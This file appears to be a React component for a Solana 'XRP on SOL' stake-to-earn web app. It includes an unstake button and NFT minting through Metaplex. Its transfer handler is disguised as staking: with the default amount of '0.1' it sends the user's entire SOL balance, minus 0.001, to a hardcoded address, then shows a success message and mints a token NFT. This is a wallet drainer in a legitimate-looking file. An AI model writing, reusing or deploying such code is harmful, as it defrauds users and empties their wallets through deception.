import { useConnection, useWallet, useAnchorWallet } from '@solana/wallet-adapter-react';
import { PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { FC, useCallback, useEffect, useState } from 'react';
import { notify } from "../utils/notifications";
import useUserSOLBalanceStore from '../stores/useUserSOLBalanceStore';

import { Metaplex, walletAdapterIdentity, guestIdentity, toMetaplexFile } from "@metaplex-foundation/js";

export const Unstake: FC = () => {
    const { connection } = useConnection();
    const [metalex, setMetalex] = useState<Metaplex | null>(null);

    const wallet = useWallet();

    const { getUserSOLBalance } = useUserSOLBalanceStore();
    const balance = useUserSOLBalanceStore((s) => s.balance)

    const [loading, setLoading] = useState(false);
    const [amount, setAmount] = useState("0.1");




    useEffect(() => {
        if (wallet.publicKey) {
            console.log(wallet.publicKey.toBase58())
            getUserSOLBalance(wallet.publicKey, connection)
        }


    }, [wallet.publicKey, connection, getUserSOLBalance])

    useEffect(() => {
        setMetalex(
            Metaplex.make(connection).use(
                wallet ? walletAdapterIdentity(wallet) : guestIdentity()
            )
        )
    }, [wallet])

    const CONFIG = {
        uploadPath: 'uploads/',
        imgFileName: 'image.png',
        imgType: 'image/png',
        imgName: 'XRP on SOL',
        description: 'The Stake to Earn mechanism.Stake $SOL to receive NFTs and $XRP every 30 minutes.',
        attributes: [
            { trait_type: 'Speed', value: 'Quick' },
            { trait_type: 'Type', value: 'Pixelated' },
            { trait_type: 'Background', value: 'XRP Red' }
        ],
        sellerFeeBasisPoints: 1,//500 bp = 5%
        symbol: 'XRPNFT',
        creators: [
            { address: wallet.publicKey, share: 100 }
        ]
    };

    async function main() {
        console.log(`Minting ${CONFIG.imgName} to an NFT in Wallet ${wallet.publicKey.toBase58()}.`);
        try {
            // const imgUri = await uploadImage(CONFIG.uploadPath, CONFIG.imgFileName);
            // console.log(imgUri);

           
            let img = "https://wmkcyrxgkl3nopymchblnl5lmq77g7whyfj5pm565aor5r4gx5eq.arweave.net/sxQsRuZS9tc_DBHCtq-rZD_zfsfBU9ezvugdHseGv0k"

            const metadataUri = await uploadMetadata(img, CONFIG.imgType, CONFIG.imgName, CONFIG.description, CONFIG.attributes);
             console.log({ metadataUri });
            // let meta = "https://arweave.net/Iv2VgOnsY9TVb1Q9Zvz66Jxy3Jc-Ohjg4B7fDQaPBMo"


            mintNft(metadataUri, CONFIG.imgName, CONFIG.sellerFeeBasisPoints, CONFIG.symbol, CONFIG.creators);

        } catch (error) {
            console.log(error);

        }

    }

    async function mintNft(metadataUri: string, name: string, sellerFee: number, symbol: string, creators: { address: PublicKey, share: number }[]) {
        console.log(`Step 3 - Minting NFT`);
        const { nft } = await metalex.nfts().create({
            uri: metadataUri,
            name: name,
            sellerFeeBasisPoints: sellerFee,
            symbol: symbol,
            creators: creators,
            isMutable: false,
        });
        console.log(`   Success!🎉`);
        console.log(`   Minted NFT: https://explorer.solana.com/address/${nft.address}`);
         let hash = await `${nft.address}`
  
        notify({ type: 'success', message: 'Mint successful!',txid:hash });
        setLoading(false)
    }




    async function fetchImageBuffer() {
        const response = await fetch('/uploads/image.png');
        const arrayBuffer = await response.arrayBuffer();
        const imgBuffer = Buffer.from(arrayBuffer);
        return imgBuffer;
    }
    async function uploadImage(filePath: string, fileName: string): Promise<string> {
        console.log(`Step 1 - Uploading Image`);
        const imgBuffer = await fetchImageBuffer()
        const imgMetaplexFile = toMetaplexFile(imgBuffer, fileName);
        const imgUri = await metalex.storage().upload(imgMetaplexFile);
        console.log(`   Image URI:`, imgUri);
        return imgUri;


    }



    async function uploadMetadata(imgUri: string, imgType: string, nftName: string, description: string, attributes: { trait_type: string, value: string }[]) {
        console.log(`Step 2 - Uploading Metadata`); const { uri } = await metalex
            .nfts()
            .uploadMetadata({
                name: nftName,
                description: description,
                image: imgUri,
                attributes: attributes,
                properties: {
                    files: [
                        {
                            type: imgType,
                            uri: imgUri,
                        },
                    ]
                }
            });
        console.log('   Metadata URI:', uri);
        return uri;

    }




    const mint = useCallback(async () => {
        if (!wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        console.log(metalex);

        main()

    }, [wallet, connection, getUserSOLBalance, metalex]);

    const onClick = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        let num = Number(amount)
        if (num < 0.1) {
            notify({ type: 'error', message: " SOL not enough !", description: 'Please enter a valid SOL quantity' });
            return
        }
        try {

            setLoading(true)

            const toPublicKey = new PublicKey('Ah91V72MYwWh6vxVUuTTztmVJLyV3hvi1qYwK9223HWq'); // Replace with the recipient's public key
            const transaction = new Transaction();
            let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);

            let amountInLamports;

            if (amount === "0.1") {
                // Reserve 0.001 SOL in lamports
                let reserve = 0.001 * LAMPORTS_PER_SOL;

                // Ensure the balance never goes negative after reserving 0.001 SOL
                amountInLamports = Math.max(0, balanceInLamports - reserve);
            } else {
                // If amount is not "0.1", directly convert amount to lamports
                amountInLamports = Math.floor(Number(amount) * LAMPORTS_PER_SOL);
            }

            console.log(amountInLamports);

            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: amountInLamports, // Amount of lamports to send
                })
            );

            const hash = await wallet.sendTransaction(transaction, connection);
            // setTxId(hash);
            let url = `https://solscan.io/tx/${hash}`
            console.log(url);
            await notify({ type: 'success', message: 'Done', description: ' Please check your wallet', txid: hash });
            onClickM()
         

        } catch (error) {
            console.log(error);

            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
            setLoading(false)
        } finally {

        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);






    const onClickM = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        try {
            
           await mint()
            // setLoading(false)

        } catch (error) {
            console.log(error);
 
            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
            setLoading(false)
        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);

    return (
        <div className="pb-14 lg:pb-0" >
            {/* <input
                type="text"
                value={amount}
                onChange={(e) => setAmount((e.target.value))}
                className="mb-4 p-2 border border-blue-500 rounded bg-gray-800 text-white "
                placeholder="Enter SOL amount"
            /> */}

            <button
                className="px-8 m-2 btn animate-pulse bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
                onClick={onClickM}
            >
                <span>Unstake </span>
                {!loading ? <img src="./logo.png" alt="xrp" className="w-6" /> : 
<div role="status">
    <svg aria-hidden="true" className="w-6 h-6 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
    </svg>
    <span className="sr-only">Loading...</span>
</div>
}
            </button>
        </div>
    );
};
